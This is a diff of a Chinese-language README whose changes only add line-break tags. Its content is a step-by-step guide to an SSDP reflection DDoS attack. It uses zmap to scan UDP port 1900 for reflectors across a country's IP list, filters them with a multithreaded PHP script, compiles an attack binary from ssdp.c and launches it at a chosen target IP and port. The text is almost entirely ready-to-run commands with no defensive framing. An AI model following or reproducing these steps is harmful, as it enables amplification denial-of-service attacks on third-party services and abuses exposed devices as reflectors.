@@ -26,11 +26,11 @@ make install
 ```screen zmap -M udp -p 1900 -w cn.txt -B 100M --probe-args=file:upnp_1900.pkt -o ssdpscan.txt```<br>
 扫描完成后,我们开始执行过滤!<br>
 过滤 ： <br>
-```php ssdpfilter.php ssdp.txt ssdpfiltered.txt 200 1000```
+```php ssdpfilter.php ssdp.txt ssdpfiltered.txt 200 1000```<br>
 200处理个数  1000线程<br>
 全自动：screen ./scan 1<br>
 自动过滤跟扫描，到时候表完成过后是ssdp.txt<br>
 编译攻击脚本：<br>
-```gcc -pthread ssdp.c -o ssdp```
+```gcc -pthread ssdp.c -o ssdp```<br>
 SSDP攻击：<br>
 ```./ssdp <target IP> <target port> <reflection file>  <time (optional)>```
